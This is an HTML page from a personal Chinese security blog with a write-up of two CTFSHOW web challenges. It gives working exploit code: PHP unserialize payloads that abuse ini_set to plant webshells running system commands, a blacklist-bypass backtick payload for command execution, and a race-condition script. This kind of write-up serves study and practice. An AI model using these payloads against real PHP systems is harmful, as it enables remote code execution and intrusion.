@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    CTFSHOW之大牛杯 |  Wh1tecell&#39;blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-CTFSHOW之大牛杯"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  CTFSHOW之大牛杯
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/06/06/CTFSHOW%E4%B9%8B%E5%A4%A7%E7%89%9B%E6%9D%AF/" class="article-date">
+  <time datetime="2021-06-06T04:54:07.000Z" itemprop="datePublished">2021-06-06</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E7%AB%99/">刷题站</a> / <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E7%AB%99/ctfshow/">ctfshow</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">6 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-04-22 17:44:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-04-26 11:30:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$settings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;settings=<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;display_errors&#x27;</span>=&gt;<span class="string">&#x27;On&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;allow_url_fopen&#x27;</span>=&gt;<span class="string">&#x27;On&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params=<span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;settings <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            ini_set(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&#x27;settings.inc&#x27;</span>, unserialize(<span class="keyword">$this</span>-&gt;params));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>法一:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$settings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;settings=<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;error_log&#x27;</span>=&gt;<span class="string">&#x27;a.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;unserialize_callback_func&#x27;</span>=&gt;<span class="string">&#x27;&lt;?php system(&quot;cat /f*&quot;);?&gt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;html_errors&#x27;</span>=&gt;<span class="literal">false</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params=serialize(<span class="keyword">new</span> A());      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> main();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>PHP的unserialize()方法会返回反序列化的值，如果该值为类，PHP在下面两种情况下会试图自动加载该类</li>
+</ul>
+<ol>
+<li>你实现了__autoload（）方法</li>
+<li>设置php.ini<br>ini_set(‘unserialize_callback_func’,’mycallback’);<br>当反序列化后，PHP会寻找mycallback这个方法来include这个类文件，如果你没定义这个方法则报错。</li>
+</ol>
+<p><strong>这个配置是用来处理，反序列化未定义的类的时候，会用指定的函数，去处理。</strong><br><strong>参数是类名</strong></p>
+<p><strong>payload解析:</strong></p>
+<ul>
+<li><p>ini_set(‘error_log’,’a.php’);<br>错误日志写入的文件名</p>
+</li>
+<li><p>ini_set(‘unserialize_callback_func’,’mycallback’);<br>当反序列化后，PHP会寻找mycallback这个方法来include这个类文件，如果你没定义这个方法则报错。</p>
+</li>
+<li><p>ini_set(‘html_errors’,false);<br>不加这个的话，错误日志内容会html编码。</p>
+</li>
+</ul>
+<p><strong>首先我们可以通过error_log生成php文件，剩下的就是怎么把想执行的命令在报错中显示。</strong><br><strong>剩下的就交给unserialize_callback_func了，明显没有 <code>&#39;&lt;?php system(&quot;cat /f*&quot;);?&gt;&#39;</code>这个方法  所以会把这个方法在报错中显示出来  然后访问a.php 就可以 rce了</strong></p>
+<p>法二:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">settings</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$settings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;settings=<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;unserialize_callback_func&#x27;</span>=&gt;<span class="string">&#x27;spl_autoload&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//$this-&gt;params=serialize(&quot;<span class="meta">&lt;?php</span> system(&#x27;cat /f*&#x27;);&quot;); 生成settings.inc文件，内容是<span class="meta">&lt;?php</span> system(&#x27;cat /f*&#x27;);</span></span><br><span class="line">        <span class="comment">//$this-&gt;params=serialize(new settings()); 加载settings.inc</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> main();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload </span><br><span class="line">它可以接收两个参数，第一个参数是$class_name，表示类名，第二个参数$file_extensions是可选的，表示类文件的扩展名,如果不指定的话，它将使用默认的扩展名.inc或.php</span><br></pre></td></tr></table></figure>
+
+<p>可以往  settings.inc 里写内容，</p>
+<p>然后修改配置，但是这个配置的存活只到脚本结束  反序列化之后 unserialize_callback_func会调用   sql_autoload 处理反序列化的类     </p>
+<p>inc 文件是可以用来 写入 php的类，如果调用了  spl_autoload(classname) 或者 spl_autoload_register()</p>
+<p>当类未定义时，会从  classname.inc /.php 文件里加载，换句话说就是把这个文件包含进来。</p>
+<p><strong>所以 这里new的类名是 settings</strong> </p>
+<p>第一次先写入木马，第二次再执行第二个  就能rce了</p>
+<h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a>web_checkin</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//flag in /</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_letter</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$letter_blacklist</span> = str_split(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$letter_blacklist</span>); <span class="variable">$i</span>+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/&quot;</span>.<span class="variable">$letter_blacklist</span>[<span class="variable">$i</span>].<span class="string">&quot;/i&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;xi nei~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_character</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$character_blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\)&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$character_blacklist</span>); <span class="variable">$i</span>+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/&quot;</span>.<span class="variable">$character_blacklist</span>[<span class="variable">$i</span>].<span class="string">&quot;/&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;tongtong xi nei~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = substr(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>], <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">    check_letter(<span class="variable">$code</span>);</span><br><span class="line">    check_character(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="string">&quot;&lt;?php &quot;</span>.<span class="variable">$code</span>.<span class="variable">$fuxkfile</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面一段waf过滤了  <code>acegikmoqsuwy13579</code>  发现可以使用了 nl</p>
+<p>第二段waf过滤了  <code>\+_\(&amp;-#@~\[&#123;\&quot; \.,:</code></p>
+<p>并且限制code长度只有12</p>
+<p>法一</p>
+<p>构造 payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`nl%09/*`</span><br></pre></td></tr></table></figure>
+
+<p>这里 %09是换行符 只算一个字符  所以长度为12刚好</p>
+<p>访问对应路径就能看到flag了</p>
+<p>法二:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=?&gt;&lt;?=`nl%09*`</span><br></pre></td></tr></table></figure>
+
+<p>获得源码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> 1	&lt;?php ?&gt;&lt;?=`nl	*`</span><br><span class="line"> 2	?&gt;</span><br><span class="line"> 3	&lt;?php</span><br><span class="line"> 4	    opendir(&quot;./&quot;);</span><br><span class="line"> 5	    while($filename = readdir()) &#123;</span><br><span class="line"> 6	    if($filename != &quot;.&quot; &amp;&amp; $filename != &quot;..&quot; &amp;&amp; $filename != &quot;index.php&quot;) &#123;</span><br><span class="line"> 7	            unlink($filename);</span><br><span class="line"> 8	        &#125;</span><br><span class="line"> 9	    &#125;</span><br><span class="line">10	    closedir();</span><br><span class="line">11	?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>条件竞争可以获得flag</p>
+<p>可以用 bp的爆破模块 或者 写个脚本</p>
+<p>脚本如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">session=requests.session()</span><br><span class="line">url1=<span class="string">&quot;http://ba2bd9c4-6f58-45a1-a637-3cf0140e89c1.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/&quot;</span></span><br><span class="line">url2=<span class="string">&#x27;http://ba2bd9c4-6f58-45a1-a637-3cf0140e89c1.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/b&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>():</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		r = session.get(url1)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		r = session.get(url2)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(r.text)!=<span class="number">9561</span>: <span class="comment">#随便get传一次就能得到这个长度</span></span><br><span class="line">    			<span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">	t.start()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>剩下的参:</p>
+<p>参:<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/116352564">https://blog.csdn.net/miuzzx/article/details/116352564</a></p>
+<p>参:<a target="_blank" rel="noopener" href="https://www.yuque.com/jinjinshigekeaigui/alad3t/dpdgcu#xnRix">https://www.yuque.com/jinjinshigekeaigui/alad3t/dpdgcu#xnRix</a></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/06/06/CTFSHOW%E4%B9%8B%E5%A4%A7%E7%89%9B%E6%9D%AF/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2021/06/08/ctfshow-web%E5%85%A5%E9%97%A8%E4%B9%8Bxss/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            ctfshow  web入门之xss
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/06/01/vmware%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">vmware三种网络工作模式</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> Wh1tecell
+      </li>
+    </ul>
+    <ul>
+      <li>
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="" target="_black" rel="nofollow">闽ICP备2021001239号</a>
+        </li>
+        
+    </ul>
+    <!-- 运行天数 -->
+	<ul>
+		<li><span id="runtime_span"></span></li>
+		<script type="text/javascript">			
+    function show_runtime() {
+        window.setTimeout("show_runtime()", 1000);
+        X = new Date("01/01/2021 12:00:00");
+        Y = new Date();
+        T = (Y.getTime() - X.getTime());
+        M = 24 * 60 * 60 * 1000;
+        a = T / M;
+        A = Math.floor(a);
+        b = (a - A) * 24;
+        B = Math.floor(b);
+        c = (b - B) * 60;
+        C = Math.floor((b - B) * 60);
+        D = Math.floor((c - C) * 60);
+        runtime_span.innerHTML = "小站在各种崩坏中坚持了:" + A + "天" + B + "小时" + C + "分" + D + "秒"
+    }
+	show_runtime();
+</script>
+
+	</ul>
+
+
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+
+
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/touxiang.png" alt="Wh1tecell&#39;blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
